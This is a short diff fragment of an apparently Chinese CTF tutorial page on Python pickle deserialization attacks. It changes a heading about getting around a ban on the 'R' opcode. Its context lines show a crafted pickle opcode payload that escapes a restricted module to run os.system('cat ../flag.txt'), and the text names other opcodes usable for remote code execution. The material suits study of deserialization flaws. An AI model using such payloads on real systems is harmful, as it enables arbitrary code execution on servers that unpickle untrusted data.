@@ -604,7 +604,7 @@ return
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>opcode&lt;/p>
 &lt;pre>&lt;code>b&amp;quot;cstructs\n__dict__\np0\n0cstructs\n__builtins__\np1\n0cstructs\n__getattribute__\np2\n0g1\nS'__import__'\ng2\nsg0\nS'structs'\ng1\nscstructs\nget\np5\n0g5\n(S'eval'\ntRp6\n0g6\n(S'pickle.sys.modules['os'].system('cat ../flag.txt')'\ntR.&amp;quot;
 &lt;/code>&lt;/pre>&lt;/details>
-&lt;h3 id="禁止br">禁止b&amp;rsquo;R'&lt;/h3>
+&lt;h3 id="禁止br操作码">禁止&lt;code>b'R'&lt;/code>操作码&lt;/h3>
 &lt;p>也就相当于不可以用&lt;code>__reduce__&lt;/code>，有以下几种应对方法（以下方法同样可以单独使用鸭！！！），变量覆盖（无直接代码执行）或利用&lt;code>b'i'&lt;/code>，&lt;code>b'i'&lt;/code>，&lt;code>b'b'&lt;/code>这些操作码来rce。&lt;/p>
 &lt;h3 id="--变量覆盖">&amp;ndash;&amp;raquo;变量覆盖&lt;/h3>
 &lt;details>
